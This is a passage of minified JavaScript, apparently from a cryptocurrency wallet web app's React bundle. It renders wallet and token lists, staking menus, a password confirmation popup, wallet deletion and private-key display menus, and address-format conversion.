              , {listOfCurrencies: h, isAllHidden: g, isAllZero: y, list: v, listOfAllFletcherTokens: _, listOfAllFletcherTokensWithoutSpam: w, listOfMultisigs: b, listToAddMnemonicCoins: k} = useRenderCurrencyAndToken(e)
              , {handleClickToken: S, handleClickCoin: C} = useClickNewCoinOrToken()
              , N = usePopup();
            function openPopupCreate() {
                N.open("import-or-create", {
                    initialTab: "create"
                })
            }
            (0,
            O.useEffect)(( () => {
                if (a) {
                    var e;
                    null === (e = c.current) || void 0 === e || e.focus()
                }
            }
            ), [a]);
            function handleSearchClick() {
                if (a) {
                    var e;
                    null === (e = c.current) || void 0 === e || e.focus()
                }
                n(!a);
                t("")
            }
            function handleOnKeyDown(e) {
                let {keyCode: r} = e;
                if (27 === r) {
                    n(!a);
                    t("")
                }
            }
            const T = (0,
            O.useMemo)(( () => e ? v.filter(E) : v.filter(f)), [f, E, v, e])
              , openPopupCreateMultisig = (e, t) => {
                null != e && e.preventDefault && (null == e || e.preventDefault());
                N.open("create-multisig", {
                    newWallet: t.currency
                })
            }
              , A = (0,
            O.useMemo)(( () => filterWallets(T.filter((e => !e.isSubWallet)), e, {
                withoutSubwallets: !0
            })), [e, T])
              , x = (0,
            O.useMemo)(( () => filterWallets(T.filter((e => e.isSubWallet)), e)), [e, T])
              , I = (0,
            O.useMemo)(( () => null == w ? void 0 : w.slice(0, s).sort()), [s, w])
              , P = (0,
            O.useMemo)(( () => null == h ? void 0 : h.slice(0, r)), [h, r])
              , L = (0,
            O.useMemo)(( () => null == k ? void 0 : k.slice(0, r)), [k, r]);
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: iT
            }, O.createElement("div", {
                className: _T
            }, a ? O.createElement("div", {
                className: wT
            }, O.createElement("div", {
                className: kT
            }, O.createElement("img", {
                src: cS,
                alt: "Glass"
            })), O.createElement(Ea, {
                ref: c,
                defaultValue: e,
                placeholder: "Search",
                onKeyDown: handleOnKeyDown,
                onChange: e => {
                    let {target: {value: t}} = e;
                    return o(t)
                }
                ,
                className: ET
            }), O.createElement("div", {
                onClick: handleSearchClick,
                className: bT
            }, "Cancel")) : O.createElement(zT, {
                onGlassClick: () => n(!0)
            })), O.createElement("div", {
                className: oT
            }, !g && !y && !T.length && !e && O.createElement(hF, null), g && !0 === d && !e && !m && O.createElement(yF, {
                list: v
            }), y && !e && m && O.createElement(yF, {
                list: v
            }), !!v.length && !g && !0 === d && !y && !T.length && !e && O.createElement(yF, {
                list: v
            }), !T.length && !h.length && !_.length && !!e && O.createElement("div", {
                className: pT
            }, O.createElement("img", {
                src: Bh,
                alt: ""
            }), O.createElement("p", null, 'No results found for "', e, '"')), O.createElement("div", {
                className: dT
            }, (e || !g || !1 === d) && O.createElement(O.Fragment, null, !!A.length && e && O.createElement("p", {
                className: cT
            }, "YOUR COINS"), O.createElement(WalletsList, {
                searchValue: e,
                list: e || p ? A : T
            }))), !!x.length && !!e && O.createElement("div", {
                className: Ht()(iT, AT)
            }, O.createElement("p", {
                className: cT
            }, "YOUR TOKENS"), O.createElement(WalletsList, {
                searchValue: e,
                list: x
            })), !!e && 0 !== b.length && O.createElement("div", {
                className: Ht()(iT, AT)
            }, O.createElement("p", {
                className: cT
            }, "ADD MULTISIGS"), b.map((e => O.createElement(DF, {
                key: `addMultisig${null == e ? void 0 : e.currency}`,
                wallet: e,
                onClick: openPopupCreateMultisig,
                isMultisig: !0
            })))), !!h.length && !!e && O.createElement("div", {
                className: Ht()(iT, AT)
            }, O.createElement("p", {
                className: cT
            }, "ADD COINS"), P.map((e => O.createElement(DF, {
                key: e.title,
                wallet: e,
                onClick: C
            }))), h.length - P.length > 0 && O.createElement("div", {
                className: xT,
                onClick: () => l((e => e + UF))
            }, O.createElement("img", {
                src: uS,
                width: "24px",
                height: "24px",
                className: IT,
                alt: "show more"
            }), "Show more")), u && !e && O.createElement("div", {
                className: Ht()(iT, AT)
            }, O.createElement("p", {
                className: cT
            }, "ADD COINS"), L.map((e => O.createElement(DF, {
                key: e.title,
                wallet: e,
                onClick: C
            }))), k.length - L.length > 0 && O.createElement("div", {
                className: xT,
                onClick: () => l((e => e + UF))
            }, O.createElement("img", {
                src: uS,
                width: "24px",
                height: "24px",
                className: IT,
                alt: "show more"
            }), "Show more")), !!_.length && !!e && O.createElement("div", {
                className: Ht()(iT, AT)
            }, O.createElement("p", {
                className: cT
            }, "ADD TOKENS"), I.map((e => O.createElement(new_available_token, {
                key: `addtoken${null == e ? void 0 : e.uuid}`,
                token: e,
                onClick: S
            }))), _.length - I.length > 0 && O.createElement("div", {
                className: xT,
                onClick: () => i((e => e + UF))
            }, O.createElement("img", {
                src: uS,
                width: "24px",
                height: "24px",
                className: IT,
                alt: "show more"
            }), "Show more")), O.createElement("div", {
                className: fT,
                onClick: openPopupCreate,
                id: "addWallet"
            }, O.createElement("img", {
                src: oS,
                className: hT,
                alt: "Add wallet or connect ledger"
            }), "Add wallet or connect ledger"), (0,
            M.d)() && O.createElement(ExtraBlocks, null), !(0,
            M.d)() && O.createElement(ExtraBlocks, null))))
        }
        const GF = "menu_menu_2wA28"
          , VF = "menu_active_3L5Jb"
          , KF = "menu_subName_3CYZr"
          , Menu_Menu = e => {
            let {children: t, className: a} = e;
            return O.createElement("nav", {
                className: Ht()(a, GF)
            }, t)
        }
          , MenuItem = e => {
            let {path: t, title: a, className: n} = e;
            return O.createElement(O.Fragment, null, t.includes("send") || t.includes("exchange") ? O.createElement(Y.OL, {
                to: t,
                className: Ht()(n),
                activeClassName: VF
            }, a) : O.createElement(Y.OL, {
                exact: !0,
                to: t,
                className: Ht()(n),
                activeClassName: VF
            }, a))
        }
          , DashboardMenu = () => {
            const e = (0,
            j.TH)();
            return (0,
            M.p1)() ? O.createElement(Menu_Menu, null, O.createElement(MenuItem, {
                path: "/app/extension",
                title: "History"
            }), O.createElement(MenuItem, {
                path: "/app/extension/receive",
                title: "Receive"
            }), O.createElement(MenuItem, {
                path: "/app/extension/send",
                title: "Send"
            }), O.createElement(MenuItem, {
                path: "/app/extension/exchange",
                title: "Exchange"
            }), O.createElement(MenuItem, {
                path: "/app/extension/settings",
                title: "Settings"
            })) : (0,
            M.tq)() ? O.createElement(Menu_Menu, null, O.createElement(MenuItem, {
                path: "/app/mobile",
                title: "History"
            }), O.createElement(MenuItem, {
                path: "/app/mobile/receive",
                title: "Receive"
            }), O.createElement(MenuItem, {
                path: "/app/mobile/send",
                title: "Send"
            }), O.createElement(MenuItem, {
                path: "/app/mobile/exchange",
                title: "Exchange"
            }), O.createElement(j.AW, {
                path: "/app/mobile/fio"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "FIO address"
            })), O.createElement(MenuItem, {
                path: "/app/mobile/settings",
                title: "Settings"
            })) : O.createElement(Menu_Menu, null, O.createElement(MenuItem, {
                path: "/app/receive",
                title: "Receive"
            }), O.createElement(MenuItem, {
                path: "/app/send",
                title: "Send"
            }), O.createElement(j.rs, null, O.createElement(j.AW, {
                path: "/app/staking-clo"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "CLO Staking"
            })), O.createElement(j.AW, {
                path: "/app/staking-xtz"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "XTZ Staking"
            })), O.createElement(j.AW, {
                path: "/app/staking-atom"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "ATOM Staking"
            })), O.createElement(j.AW, {
                path: "/app/staking-ada"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "ADA Staking"
            })), O.createElement(j.AW, {
                path: "/app/airdrop-xrp"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "Spark airdrop"
            })), O.createElement(j.AW, {
                path: "/app/xrp-delete-account"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "Close XRP account"
            })), O.createElement(j.AW, {
                path: "/app/staking-eos"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "EOS Staking"
            })), O.createElement(j.AW, {
                path: "/app/fio"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "FIO address"
            })), O.createElement(j.AW, {
                path: "/app/crux"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "CRUX ID"
            })), O.createElement(j.AW, {
                path: "/app/staking-trx"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "Tron Staking"
            })), O.createElement(j.AW, {
                path: "/app/staking-eth"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "ETH Staking"
            })), O.createElement(j.AW, {
                path: "/app/staking-ont"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "ONT Staking"
            })), O.createElement(j.AW, {
                path: "/app/staking-one"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "ONE Staking"
            })), O.createElement(j.AW, {
                path: "/app/staking-zil"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "ZIL Staking"
            })), O.createElement(j.AW, {
                path: "/app/staking-bnb/staking"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "NOW Staking"
            })), O.createElement(j.AW, {
                path: "/app/staking-bnb/unstaking"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "NOW Unstaking"
            })), O.createElement(j.AW, {
                path: "/app/staking-qtum/staking"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "QTUM Staking"
            })), O.createElement(j.AW, {
                path: "/app/ud"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "UD purchase"
            })), O.createElement(j.AW, {
                path: "/app/bch-split"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "BCH Split"
            })), O.createElement(j.AW, {
                path: "/app/add-token-hbar"
            }, O.createElement(MenuItem, {
                path: e.pathname + e.search,
                title: "Add Hedera token"
            }))))
        }
          , HF = "empty-wallets_emptyState_MxFxy"
          , zF = "empty-wallets_title_NMlxQ"
          , jF = a.p + "b657fc1193316f0f176f028fc52d47a5.svg"
          , $F = undefined
          , empty_wallets = e => {
            const t = usePopup();
            return O.createElement("div", {
                className: HF
            }, O.createElement("img", {
                src: jF,
                alt: ""
            }), e.children ? e.children : O.createElement(O.Fragment, null, O.createElement("p", {
                className: zF
            }, e.title || "You don’t have any wallets."), O.createElement("p", null, "Please,  ", O.createElement("a", {
                onClick: () => {
                    t.open("import-or-create", {
                        initialTab: "create"
                    })
                }
            }, "add new wallet"), "  or  ", O.createElement(Y.OL, {
                to: "/app/settings/restore-backup"
            }, "restore"), " your wallet from the backup.")))
        }
          , ZF = {
            wrapper: "main_wrapper_3197y",
            blink: "main_blink_E6hT2",
            wrapperPaginator: "main_wrapperPaginator_3wYhr app_wrapperBlock_2EpA3",
            wrapperShadow: "main_wrapperShadow_Qnfkj",
            chartTitle: "main_chartTitle_n_1Go",
            txDateBlock: "main_txDateBlock_p6Ebz",
            additionalInfoWrapper: "main_additionalInfoWrapper_mV4sX",
            loadingWrapper: "main_loadingWrapper_3T9ra",
            fioEmptyImage: "main_fioEmptyImage_2sf68",
            emptyFioLinkWrapper: "main_emptyFioLinkWrapper_36kLZ",
            informationEmptyWrapButtons: "main_informationEmptyWrapButtons_1uNdi",
            wrapperNotifications: "main_wrapperNotifications_2NaKr",
            block: "main_block_15zml",
            wrapperBlocks: "main_wrapperBlocks_150ld",
            wrapperWallets: "main_wrapperWallets_19CZw",
            wallerWrapper: "main_wallerWrapper_3wWNs",
            walletInfoContainer: "main_walletInfoContainer_1Fs-Y",
            extraButtonWrapper: "main_extraButtonWrapper_3XZ62",
            walletInfo: "main_walletInfo_3IaLQ",
            titleBlock: "main_titleBlock_3I5m-",
            titleBlockAddress: "main_titleBlockAddress_25et4",
            contentBlock: "main_contentBlock_3A6he",
            fiatAmount: "main_fiatAmount_1gACL",
            buttonAction: "main_buttonAction_26-IH styles_dashedNormal_xEvl8",
            addressText: "main_addressText_ertuY",
            error: "main_error_G_SlV",
            wrapperTokenParentWallets: "main_wrapperTokenParentWallets_D4zbA",
            inline: "main_inline_3xrtU",
            doubleLine: "main_doubleLine_3wa5D",
            iconAccount: "main_iconAccount_3gdUW",
            iconExplorer: "main_iconExplorer_1jjAY",
            buttonLink: "main_buttonLink_rlHQU",
            fakeQRcode: "main_fakeQRcode_Cr1si",
            buttonSend: "main_buttonSend_1WRe2",
            filterWrapper: "main_filterWrapper_AKf-B",
            wrapperTextCenter: "main_wrapperTextCenter_2VZI2",
            blockLoader: "main_blockLoader_3pCqW",
            loadTransactionsWrapper: "main_loadTransactionsWrapper_3VcZi",
            userSelect: "main_userSelect_2aAUn",
            hbarLinkInfo: "main_hbarLinkInfo_bV9Sz",
            tokenParentWalletsBlock: "main_tokenParentWalletsBlock_3OI9B",
            likeLink: "main_likeLink_i4p-2"
        }
          , YF = "popup-password_popupContent__08rF"
          , qF = "popup-password_closeButton_1ZadV rate-us_closeButton_3atrp"
          , XF = "popup-password_wrapper_1cSY0"
          , QF = "popup-password_popupWrapper_34SGM"
          , JF = "popup-password_popupTitle_2J96c"
          , eW = "popup-password_newPopupTitle_1AH2K"
          , tW = "popup-password_inputConfirmation_wFdVB"
          , aW = "popup-password_popupFields_20ly4"
          , nW = "popup-password_errorPassword_1gtKW"
          , rW = "popup-password_inputFieldset_25d4o"
          , lW = "popup-password_inputFocus_3kqaF"
          , sW = "popup-password_inputLegend_3C9ZH"
          , iW = "popup-password_icon_1q2Uo"
          , oW = "popup-password_clearPassIconBlue_2hZPz change-password_clearPassIconBlue_17_Q2"
          , cW = "popup-password_clearPassIcon_21hAr change-password_clearPassIcon_SWaqm"
          , uW = "popup-password_leftIcon_3JoJ4 change-password_leftIcon_KOJkO"
          , dW = "popup-password_rightIcon_3wbBg change-password_leftIcon_KOJkO"
          , mW = "popup-password_showPassIconBlue_2Mmny change-password_showPassIconBlue_1XcoB"
          , pW = "popup-password_showPassIcon_2h_9t change-password_showPassIcon_1rub_"
          , fW = "popup-password_hidePassIconBlue_3g4J1 change-password_hidePassIconBlue_1rDTt"
          , EW = "popup-password_hidePassIcon_3IWXW change-password_hidePassIcon_12q18"
          , hW = "popup-password_bigDot_2fLU5 change-password_bigDot_3Qbpx"
          , gW = "popup-password_error_L7PmC change-password_error_1TVjI"
          , yW = "popup-password_inputPassword_3jf3c"
          , vW = "popup-password_newButton_3eyy0"
          , _W = "popup-password_newContent_fm8Qq"
          , wW = "popup-password_newErrorPassword_2_NIt"
          , bW = a.p + "8fe5f95368d76ab243ecd0820d31bf9e.svg";
        var kW = a(17723)
          , SW = a.n(kW);
        const PopupConfirmPassword = e => {
            const t = (0,
            $.I0)()
              , a = O.createRef()
              , [n,r] = (0,
            O.useState)("")
              , [l,s] = (0,
            O.useState)(!1);
            let i;
            const o = (0,
            O.useRef)(null)
              , [c,u] = (0,
            O.useState)(!1)
              , [d,m] = (0,
            O.useState)(!1)
              , [p,f] = (0,
            O.useState)(!1);
            (0,
            O.useEffect)(( () => {
                f(!1)
            }
            ), [n]);
            const {isNewDesign: E} = e
              , handleClose = () => {
                r("");
                e.onClose()
            }
              , handleConfirm = l => {
                var c, u;
                f(!1);
                const {isValid: d} = null !== (c = null === (u = a.current) || void 0 === u ? void 0 : u.validate()) && void 0 !== c ? c : {};
                if (d)
                    if (t(checkMasterPassword(n))) {
                        r("");
                        e.onSuccessPassword(l)
                    } else {
                        var m;
                        s(!0);
                        r("");
                        null === (m = o.current) || void 0 === m || m.focus();
                        window.clearTimeout(i);
                        i = window.setTimeout(( () => s(!1)), 2e3)
                    }
                else
                    f(!0)
            }
            ;
            return O.createElement(aa, {
                visible: e.visible,
                width: E ? 446 : 515,
                onClose: handleClose,
                withoutCloseIcon: E,
                className: XF
            }, O.createElement("div", {
                className: Ht()(YF, E && QF)
            }, O.createElement("div", {
                className: qF,
                dangerouslySetInnerHTML: {
                    __html: SW()
                },
                onClick: handleClose
            }), O.createElement("div", {
                className: Ht()(E ? eW : JF)
            }, !E && O.createElement("img", {
                src: bW,
                alt: ""
            }), O.createElement("h3", null, e.title)), O.createElement("div", {
                className: Ht()(E && _W)
            }, e.children), !E && O.createElement("div", {
                className: aW
            }, O.createElement(Ea, {
                ref: o,
                autoFocus: !0,
                type: "password",
                value: n,
                onChange: e => {
                    let {target: {value: t}} = e;
                    return r(t)
                }
                ,
                onEnter: handleConfirm,
                placeholder: "Password",
                autoComplete: "off",
                className: tW
            }), O.createElement(Yl, {
                color: "red",
                onClick: handleConfirm
            }, e.buttonText)), E && O.createElement(O.Fragment, null, O.createElement(sf(), {
                ref: a
            }, O.createElement("fieldset", {
                className: Ht()(rW, c && lW, p && gW, l && gW),
                onFocus: () => u(!0),
                onBlur: () => u(!1)
            }, O.createElement("legend", {
                className: Ht()(sW, c && lW)
            }, "Password"), O.createElement(lf.ValidatorField, {
                value: n,
                rules: zf.password
            }, (e => {
                let {isValid: t, message: a} = e;
                !t && p && s(!1);
                return O.createElement(pa, {
                    isNewDesign: !0,
                    isInvalid: !t && p,
                    message: a,
                    top: 5,
                    left: 10
                }, O.createElement(Ea, {
                    className: Ht()(yW, n && !d && hW),
                    ref: o,
                    type: d ? "text" : "password",
                    placeholder: "Enter password",
                    autoComplete: "off",
                    value: n,
                    onEnter: handleConfirm,
                    onChange: e => {
                        let {target: {value: t}} = e;
                        return r(t)
                    }
                    ,
                    autoFocus: !0
                }))
            }
            )), n && O.createElement("span", {
                onClick: () => r(""),
                className: Ht()(iW, c ? oW : cW, uW)
            }), O.createElement("span", {
                onClick: () => m((e => !e)),
                className: Ht()(iW, !d && (c ? mW : pW), d && (c ? fW : EW), dW)
            }), O.createElement("div", {
                className: wW
            }, l && "Password is invalid"))), O.createElement(Yl, {
                color: "blue",
                onClick: handleConfirm
            }, e.buttonText)), l && !E && O.createElement("div", {
                className: Ht()(nW, E && wW)
            }, "Password is invalid")))
        }
          , CW = PopupConfirmPassword
          , NW = "extra-menu_wrapper_nQDBL"
          , TW = "extra-menu_menuWrapper_282dy"
          , AW = "extra-menu_list_1SYc_"
          , xW = "extra-menu_deleteAccount_29qpb"
          , IW = "extra-menu_iconWrapper_4YAP3"
          , useGoToReceivePage = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            j.k6)();
            return a => async n => {
                null != n && n.preventDefault && n.preventDefault();
                null != n && n.stopPropagation && n.stopPropagation();
                if (a) {
                    await e(updateWalletsBalanceAndTxs(a));
                    await e(setActiveWallet(a));
                    t.push("/app/receive")
                }
            }
        }
        ;
        function extra_menu_ExtraMenu(e) {
            let {wallet: t} = e;
            const [a,n] = (0,
            O.useState)(!1)
              , [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)(null)
              , u = (0,
            $.v9)(eu)
              , d = (0,
            $.v9)(lu)
              , m = useGoToReceivePage()
              , p = (0,
            $.I0)()
              , f = (0,
            O.useContext)(Vt)
              , E = useLocationSearch();
            (0,
            O.useEffect)(( () => {
                i(!1);
                if (null != E && E.isSubWallet || t.isSubWallet) {
                    var e;
                    let a = u(null == E ? void 0 : E.parentUuid);
                    a || (a = d(null == t ? void 0 : t.uuid));
                    c(a);
                    null !== (e = a) && void 0 !== e && e.watchOnly && i(!0)
                }
            }
            ), [u, null == E ? void 0 : E.isSubWallet, null == E ? void 0 : E.parentUuid, d, t]);
            const h = O.useCallback((async e => {
                p(rd.removeWallet({
                    wallet: t
                }));
                await p(removeTransactionsByWallet(t));
                ge.b.success(ge.d.DELETE_WALLET_SUCCESS, {
                    key_currency: t.currency
                });
                cc.$.send(cc.d.WALLET_REMOVE_SINGLE, t.currency);
                await p(handleDownload(Sm.BEFORE_REMOVE_WALLET));
                n(!1);
                t.isSubWallet && o && m(o)(e)
            }
            ), [p, t])
              , openPopupPrivateKey = e => {
                const t = e.isSubWallet && e.address === (null == o ? void 0 : o.address) ? o : e;
                f.open("private", {
                    wallet: null != t ? t : void 0
                })
            }
              , openPopupShowSmartContract = e => {
                const t = e.currency
                  , a = e.smartContract || "";
                f.open("smart-contract", {
                    ticker: t,
                    smartContract: a
                })
            }
            ;
            return s ? null : O.createElement("div", {
                className: NW
            }, O.createElement("div", {
                className: IW,
                onClick: () => l(!0)
            }, O.createElement("img", {
                src: GT,
                alt: "Menu"
            })), O.createElement(Xl(), {
                visible: r,
                onClose: () => l(!1)
            }, O.createElement("div", {
                className: TW
            }, O.createElement("ul", {
                className: AW
            }, !t.watchOnly && !t.hw && t.family && "eth" === t.family && t.smartContract && O.createElement("li", {
                onClick: () => openPopupShowSmartContract(t)
            }, "Show smart contract"), !t.watchOnly && !t.hw && O.createElement("li", {
                onClick: () => openPopupPrivateKey(t)
            }, "Show private keys"), O.createElement("li", {
                onClick: () => n(!0)
            }, "Delete wallet"), t.watchOnly || t.hw || "xrp" !== t.currency || !(0,
            Ko.eg)(t.balance, "1") ? null : O.createElement(O.Fragment, null, O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/xrp-delete-account?walletFrom=${t.uuid}`,
                className: xW
            }, O.createElement("li", null, "Delete account")))))), O.createElement(CW, {
                onClose: () => n(!1),
                visible: a,
                onSuccessPassword: h,
                title: `Delete ${t.title} wallet?`,
                buttonText: "Delete",
                isNewDesign: !0
            }, O.createElement("p", null, O.createElement("span", null, "By deleting this wallet, you will no longer be able to access the funds in it."))))
        }
        let PW, LW;
        !function(e) {
            e.eth = "eth";
            e.hbar = "hbar"
        }(PW || (PW = {}));
        !function(e) {
            e.eth_erc20 = "eth_erc20";
            e.hbar_hbar = "hbar_hbar"
        }(LW || (LW = {}));
        const FW = new Map([[LW.eth_erc20, 300], [LW.hbar_hbar, 60]])
          , WW = new Map([[LW.eth_erc20, 1e3], [LW.hbar_hbar, 100]])
          , RW = new Map([[LW.eth_erc20, {
            currency: "ropsten",
            network: PW.eth
        }], [LW.hbar_hbar, {
            currency: "hbar-testnet",
            network: PW.hbar
        }]])
          , BW = new Map([[LW.eth_erc20, {
            currency: "eth",
            network: PW.eth
        }], [LW.hbar_hbar, {
            currency: "hbar",
            network: PW.hbar
        }]])
          , OW = new Map([[LW.eth_erc20, {
            title: "Ethereum",
            type: "ERC20",
            network: PW.eth
        }], [LW.hbar_hbar, {
            title: "Hedera Hashgraph",
            type: "HBAR",
            network: PW.hbar
        }]]);
        function EthLinkInformation(e) {
            let {wallet: t} = e;
            const a = usePopup();
            if ("eth" !== t.currency || t.type !== we.uQ.ETH_LIKE_WALLET)
                return null;
            function handleOpenAddToken(e) {
                e.stopPropagation();
                a.open("custom-token", {
                    wallet: t
                })
            }
            return O.createElement("div", {
                className: DA.buttonLink
            }, O.createElement("a", {
                href: "https://guarda.co/app/supported-currencies",
                rel: "noopener noreferrer",
                target: "_blank"
            }, "Receive supported ERC-20 tokens"), O.createElement("br", null), O.createElement("span", {
                onClick: handleOpenAddToken,
                className: DA.addLink,
                id: "addCustomTokenAddress"
            }, "Add your custom token"), " or ", O.createElement(Y.OL, {
                to: `/app/token-generator?tokenType=${LW.eth_erc20}`
            }, "Create token"))
        }
        const DW = {
            buttonAction: "wallet-address_buttonAction_2YGgG styles_dashedNormal_xEvl8"
        };
        function wallet_address_WalletAddress(e) {
            return O.createElement("div", {
                className: DW.wrapper
            }, e.wallet.accountName ? "Account" : "Wallet address:", " ")
        }
        const MW = a.p + "407a54dc3c77fdedafae2f6171526642.svg"
          , UW = "new-token-parent-wallets-list_wrapper_1e9Vx"
          , GW = "new-token-parent-wallets-list_menuWrapper_1LAsa"
          , VW = "new-token-parent-wallets-list_walletsWrapper_31SC6"
          , KW = "new-token-parent-wallets-list_list_34F8_"
          , HW = "new-token-parent-wallets-list_iconWrapper_15fek"
          , zW = "new-token-parent-wallets-list_linkToRules_1iNqr"
          , jW = "new-token-parent-wallets-list_linkIcon_3LAJo"
          , $W = a.p + "a98aedd952d561ddf72ce3ccbfd4638f.svg"
          , ZW = "https://support.guarda.com/getting-started/main-wallet-what-is-it"
          , findSubwallet = e => t => !(!t || !t.subWallets) && (!!t.subWallets.length && t.subWallets.find((t => {
            let {currency: a} = t;
            return (0,
            Ho.t)(e.currency) === (0,
            Ho.t)(a)
        }
        )));
        function TokenParentWalletsList(e) {
            let {wallets: t, onChange: a, token: n} = e;
            const [r,l] = (0,
            O.useState)(!1)
              , handleOnChange = e => {
                a(e);
                l(!1)
            }
              , {renderWallets: s, renderItem: i} = useRenderWallets({
                withoutSubwallets: !0,
                onChange: handleOnChange,
                addNewWalletForToken: !0
            })
              , o = t.filter((e => e.currency === n.family))
              , c = o.filter((e => !findSubwallet(n)(e)))
              , u = (0,
            be.II)(n.family)
              , d = {
                currency: null == u ? void 0 : u.currency,
                title: `NEW ${null == u ? void 0 : u.title}`
            };
            (0,
            O.useEffect)(( () => {
                c.length ? a(c[0]) : a(d)
            }
            ), [n]);
            return O.createElement("div", {
                className: UW
            }, O.createElement("div", {
                className: HW,
                onClick: () => l(!0)
            }, O.createElement("img", {
                src: MW,
                width: "17px",
                height: "17px",
                alt: "Menu"
            })), O.createElement(Xl(), {
                visible: r,
                onClose: () => l(!1)
            }, O.createElement("div", {
                className: GW
            }, O.createElement("div", {
                className: zW
            }, "Main Wallet. ", O.createElement("a", {
                href: ZW,
                target: "_blank",
                rel: "noreferrer noopener"
            }, "What is it?", O.createElement("img", {
                className: jW,
                src: $W,
                alt: "link icon"
            }))), O.createElement("div", {
                className: VW
            }, !(null == c || !c.length) && s(c), i(d, "list", null)))))
        }
        function NewTokenParentAddress(e) {
            const {newCoinOrToken: t, parentWalletForNewToken: a, wallets: n, handleSetParentWalletForNewToken: r} = e;
            return O.createElement("div", {
                className: ZF.tokenParentWalletsBlock
            }, O.createElement(yA, {
                wallet: a
            }), O.createElement(TokenParentWalletsList, {
                wallets: n,
                onChange: r,
                token: t
            }))
        }
        const NewCoinOrTokenGenerateAddress = e => {
            let {handleGenerateAddress: t} = e;
            const a = (0,
            $.v9)(zc);
            return a ? O.createElement(O.Fragment, null, O.createElement("span", {
                style: {
                    color: "#7190EB"
                }
            }, a ? "Generating address" : null), " ", O.createElement(LoaderDots, {
                visible: !0
            })) : O.createElement("div", {
                className: ZF.wrapperTokenParentWallets
            }, O.createElement("a", {
                className: Ht()(ZF.addressText, ZF.inline),
                onClick: t
            }, "Generate address"))
        }
        ;
        function WalletLinkedFioAccount(e) {
            var t;
            const a = (0,
            $.v9)(Lo)
              , n = (0,
            $.I0)()
              , r = a(null == e || null === (t = e.wallet) || void 0 === t ? void 0 : t.address);
            (0,
            O.useEffect)(( () => {
                async function fetchFioAddresses() {
                    n(fetchAllFIOInfo())
                }
                e.wallet && fetchFioAddresses()
            }
            ), []);
            return e.wallet && a && r ? O.createElement("div", {
                className: ZF.wrapper
            }, O.createElement("br", null), O.createElement("div", {
                className: ZF.titleBlock
            }, "FIO address:"), O.createElement("div", {
                className: ZF.contentBlock
            }, O.createElement(button_copy, {
                text: r
            }, (e => e ? "Copied" : `${r}`)))) : null
        }
        const YW = {
            buttonAction: "wallet-convertable-address_buttonAction_3936e styles_dashedNormal_xEvl8",
            titleBlock: "wallet-convertable-address_titleBlock_11GbO",
            contentBlock: "wallet-convertable-address_contentBlock_1k0Wg",
            addressText: "wallet-convertable-address_addressText_3ignK"
        }
          , wallet_convertable_address_WalletAddress = e => {
            let {wallet: t} = e;
            const [a,n] = (0,
            O.useState)(null)
              , [r,l] = (0,
            O.useState)(null);
            async function convertAddress() {
                null != t && t.legacyAddress && n(null == t ? void 0 : t.legacyAddress);
                const e = undefined
                  , a = (await Se.Z.getApiByWallet(t)).toConvertAddress({
                    address: t.address,
                    type: "cash"
                });
                a && l(a)
            }
            (0,
            O.useEffect)(( () => {
                if (t) {
                    var e;
                    const a = null === (e = Se.Z.getMetadataByWallet(t)) || void 0 === e ? void 0 : e.features;
                    if (null != a && a.isConvertableAddress)
                        convertAddress();
                    else {
                        l(null);
                        n(null)
                    }
                }
            }
            ), [t]);
            return a && r && t ? O.createElement("div", {
                className: YW.wrapper
            }, t.address !== a && O.createElement(O.Fragment, null, O.createElement("div", {
                className: YW.titleBlock
            }, "Address in legacy format: "), O.createElement("div", {
                className: YW.contentBlock
            }, O.createElement(button_copy, {
                text: a,
                className: YW.addressText
            }, (e => e ? "Address copied to clipboard" : a)))), t.address !== r && O.createElement(O.Fragment, null, O.createElement("div", {
                className: YW.titleBlock
            }, "Address in cash format: "), O.createElement("div", {
                className: YW.contentBlock
            }, O.createElement(button_copy, {
                text: r,
                className: YW.addressText
            }, (e => e ? "Address copied to clipboard" : r))))) : null
        }
          , qW = wallet_convertable_address_WalletAddress;
        function FioRequestButton(e) {
            if (!e.wallet)
                return null;
            const t = basic_memo_wallet(e.wallet);
            function getUrlParams() {
                return "fio" === t.currency ? `fioWalletFrom=${t.uuid}` : `walletTo=${t.uuid}`
            }
            return O.createElement(O.Fragment, null, O.createElement(Y.OL, {
                to: `/app/fio/invoice-create?${getUrlParams()}`
            }, O.createElement(Yl, {
                className: ZF.buttonSend,
                color: "light-blue"
            }, "Request")))
        }
        FioRequestButton.propTypes = {
            wallet: as().object.isRequired
        };
        var XW = a(84277)
          , QW = a.n(XW)
          , JW = a(33967)
          , eR = a.n(JW)
          , tR = a(11149)
          , aR = a.n(tR);
        const nR = "wallet-title_wrapper_21NTc"
          , rR = "wallet-title_wrapperIcons_1Ur-i"
          , lR = "wallet-title_iconPencil_3K078"
          , sR = "wallet-title_toggleButton_19I1q"
          , iR = "wallet-title_titleWrapper_1lfcg"
          , oR = "wallet-title_input_3IFG5"
          , cR = "wallet-title_inputTitle_1qoG-"
          , uR = "wallet-title_hidden_SSUSC"
          , dR = "wallet-title_isHidden_1Mfce"
